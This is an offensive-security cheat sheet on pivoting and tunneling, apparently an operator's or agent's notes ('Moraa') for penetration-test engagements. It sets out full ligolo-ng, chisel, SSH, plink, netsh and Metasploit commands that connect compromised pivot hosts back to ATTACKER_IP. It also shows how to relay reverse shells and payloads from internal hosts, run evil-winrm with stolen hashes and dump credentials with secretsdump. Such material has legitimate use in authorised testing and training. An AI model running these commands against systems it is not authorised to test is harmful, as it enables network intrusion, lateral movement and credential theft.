# Moraa — Pivoting / Tunneling / Port Forwarding

> Owner's #1 weak area + standing rule: **set up the pivot BEFORE going deeper.**
> Default tool: **ligolo-ng**. Fallbacks: chisel + proxychains, SSH forwarding, sshuttle.
> Commands first. Replace ATTACKER_IP, PIVOT_IP, TARGET_SUBNET as you go.

---

## Decision: which tunnel do I use?

| Situation | Use |
|---|---|
| You have a shell + can drop a binary on the pivot host | **ligolo-ng** (cleanest, no proxychains) |
| Can't run ligolo / very locked down | **chisel** SOCKS + proxychains |
| You have SSH creds/key on the pivot | **SSH** dynamic (`-D`) or sshuttle |
| Single port only, quick | SSH local/remote forward, or chisel single-port |
| Web-app RCE, no inbound allowed | **reverse** ligolo/chisel (agent connects out to you) |

Golden rule: prefer **reverse** connections (victim → attacker) so you don't depend on inbound
firewall rules on the target.

---

## ligolo-ng (DEFAULT — memorize this)

ligolo gives you a real `tun` interface — you just `ip route add` the target subnet and use
your tools natively (nmap, nxc, impacket, browser) with **no proxychains**.

### 1. Attacker setup (once)

```bash
# Create the tun interface ligolo will bind to
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start the proxy/listener (self-signed cert)
./proxy -selfcert -laddr 0.0.0.0:11601
```

### 2. On the pivot host (the machine with a foot in both networks)

```bash
# Linux agent (reverse connect back to you)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows agent
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

### 3. In the ligolo proxy console

```
session                      # list sessions, pick the new agent
1                            # select session #1
ifconfig                     # see the pivot's interfaces/subnets → note TARGET_SUBNET
start                        # start the tunnel for this session
```

### 4. Add the route (on attacker, in a normal terminal)

```bash
sudo ip route add TARGET_SUBNET/24 dev ligolo     # e.g. 172.16.5.0/24
ip route | grep ligolo                            # verify
```

Now hit the internal subnet directly:

```bash
nmap -sC -sV 172.16.5.10
nxc smb 172.16.5.0/24
evil-winrm -i 172.16.5.19 -u admin -H <hash>
```

### Listeners / reverse shells THROUGH ligolo (catch shells from internal hosts)

The internal host can't reach your attacker IP directly — use a ligolo listener to relay a
port from the agent back to your machine:

```
# In ligolo console, on the selected session:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
listener_list
```

Now an internal target connecting to `PIVOT_IP:4444` lands in your local `nc -lvnp 4444`.
Same trick to serve payloads (e.g. relay 80/8000 to your python http.server).

### Double pivot (network behind the network)

```
# Run a second agent ON a host in the first internal subnet, connecting to the first agent's
# relayed listener (or directly if routable). Then in ligolo:
session            # select the 2nd agent
start
# attacker:
sudo ip route add SECOND_SUBNET/24 dev ligolo
```

Tip: give each tunnel its own interface (`ligolo`, `ligolo2`) to keep routes clean:
`sudo ip tuntap add user $(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up`, then in
console `start --tun ligolo2`.

### Agent-less / local relay (if you can't run the binary, but have an existing shell)
Use chisel/SSH below instead.

---

## chisel + proxychains (fallback #1)

### Reverse SOCKS5 (victim connects to you — preferred)

```bash
# Attacker (server)
./chisel server -p 8080 --reverse

# Pivot host (client) — opens a SOCKS proxy on attacker's 127.0.0.1:1080
./chisel client ATTACKER_IP:8080 R:1080:socks
chisel.exe client ATTACKER_IP:8080 R:1080:socks   # Windows
```

### Forward SOCKS5 (you connect to victim — if inbound allowed)

```bash
# Pivot host
./chisel server -p 8080 --socks5
# Attacker
./chisel client PIVOT_IP:8080 1080:socks
```

### proxychains config (`/etc/proxychains4.conf` — last line)

```
socks5 127.0.0.1 1080
```

Use it:

```bash
proxychains -q nmap -sT -Pn -n 172.16.5.10          # -sT only (no SYN through SOCKS), -Pn
proxychains -q nxc smb 172.16.5.0/24
proxychains -q evil-winrm -i 172.16.5.19 -u u -p p
proxychains -q impacket-secretsdump corp/u:p@172.16.5.10
```

proxychains gotchas: TCP connect scans only (`-sT`), always `-Pn -n`, ICMP won't traverse,
it's slow — scan few ports (`-p 445,3389,5985,88,389`).

### chisel single port forward

```bash
# Expose internal 172.16.5.10:3389 on attacker 127.0.0.1:3389 (reverse)
./chisel client ATTACKER_IP:8080 R:3389:172.16.5.10:3389
```

---

## SSH forwarding (fallback #2 — when you have SSH on the pivot)

```bash
# Dynamic (SOCKS proxy on 1080) — then use proxychains
ssh -D 1080 -fNq user@PIVOT_IP

# Local forward: attacker 127.0.0.1:8500 → internal 172.16.5.10:80 via pivot
ssh -L 8500:172.16.5.10:80 user@PIVOT_IP

# Remote forward: pivot 0.0.0.0:8000 → attacker 127.0.0.1:80 (push a service in)
ssh -R 8000:127.0.0.1:80 user@PIVOT_IP

# sshuttle — VPN-like, no proxychains, routes a whole subnet
sshuttle -r user@PIVOT_IP 172.16.5.0/24 -x PIVOT_IP
```

Windows pivot with plink:

```cmd
plink.exe -ssh -D 1080 user@PIVOT_IP
plink.exe -ssh -R 8000:127.0.0.1:80 user@ATTACKER_IP
```

---

## Windows-native port forwarding (no tools dropped)

```cmd
:: netsh portproxy — forward pivot:LPORT → internal:RPORT (needs admin)
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 ^
  connectport=3389 connectaddress=172.16.5.10
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0

:: open the firewall for it
netsh advfirewall firewall add rule name=fwd dir=in action=allow protocol=TCP localport=3389
```

Metasploit (if you're in a meterpreter session):

```
run autoroute -s 172.16.5.0/24
portfwd add -l 3389 -p 3389 -r 172.16.5.10
use auxiliary/server/socks_proxy   # then proxychains
```

---

## Workflow checklist (do this every time before deeper enum)

1. [ ] Identify the pivot host's second NIC/subnet (`ip a` / `ipconfig` / ligolo `ifconfig`).
2. [ ] Choose tunnel (ligolo default) and establish it **reverse** if possible.
3. [ ] Add route / SOCKS, then **verify** with one host (`nxc smb ONE_HOST`).
4. [ ] Set up a relay listener so internal hosts can shell back to you.
5. [ ] Note the tunnel details in `engagements/<target>/pivot/` (ports, routes, agent locations)
       so you can rebuild it after a drop.
6. [ ] Only now: full internal recon + AD enum (see `active-directory.md`).

## Common failures → fix

| Symptom | Fix |
|---|---|
| Route added but no replies | Wrong subnet; check pivot's `ifconfig`, and that `start` ran in ligolo |
| nmap SYN scan hangs over proxychains | Use `-sT -Pn -n`, few ports |
| Internal host can't reach my shell | Use a ligolo `listener_add` / chisel `R:` relay, not your raw IP |
| ligolo agent won't connect | Firewall blocks 11601 outbound; try 443; confirm `-ignore-cert` |
| Double pivot routes collide | Use separate tun interfaces (`ligolo`, `ligolo2`) |
